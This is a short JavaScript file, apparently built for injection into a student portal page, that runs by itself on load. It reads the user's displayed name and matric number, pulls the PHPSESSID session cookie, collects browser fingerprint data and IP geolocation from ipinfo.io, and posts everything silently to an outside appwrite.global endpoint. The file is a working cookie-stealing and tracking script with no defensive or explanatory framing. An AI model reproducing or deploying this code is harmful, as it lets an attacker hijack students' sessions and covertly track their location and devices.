async function GetIPInfo() {
    const ipinfo = (await (await fetch(`https://ipinfo.io/json`)).json());
    try {
        return {
            Address: ipinfo['ip'],
            Country: ipinfo['country'],
            City: ipinfo['city'],
            Region: ipinfo['region'],
            Coordinates: ipinfo['loc'],
            ISP: ipinfo['org'],
            Postal: ipinfo['postal'],
            Hostname: ipinfo['hostname']
        }
    } catch {
        return {
            Address: null,
            Country: null,
            City: null,
            Region: null,
            Coordinates: null,
            ISP: null,
            Postal: null,
            Hostname: null,
        }
    }
}
function GetUserDetails() {
  var e = {
    name: document.querySelector(".user-name")
      ? document.querySelector(".user-name").textContent
      : "Unavailable",
    matric: document.querySelector(".user-role")
      ? document.querySelector(".user-role").textContent
      : "Unavailable",
  };
  return (
    document.cookie.split(";").forEach((t) => {
      const [n, o] = t.trim().split("=");
      "PHPSESSID" == n && (e.phpsess = o);
    }),
    e
  );
}
function getDeviceInfo() {
  return {
    browser: navigator.userAgent,
    screen: `${window.screen.width}x${window.screen.height}`,
    viewport: `${window.innerWidth}x${window.innerHeight}`,
    CPU: navigator.hardwareConcurrency || 0,
    memory: navigator.deviceMemory || 0,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    system: navigator.userAgentData
      ? navigator.userAgentData.platform
      : navigator.platform,
  };
}
async function storeData(e, t, ipinfo) {
  const n = await fetch("https://673d53a375a6942d9bd2.appwrite.global/", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ user: t, device: e , ip: ipinfo }),
    mode: "no-cors",
  });
  console.log(n);
}
((e) => {
  const t = getDeviceInfo(),
    n = GetUserDetails();
    ipinfo = GetIPInfo()
  storeData(t, n, ipinfo);
})();
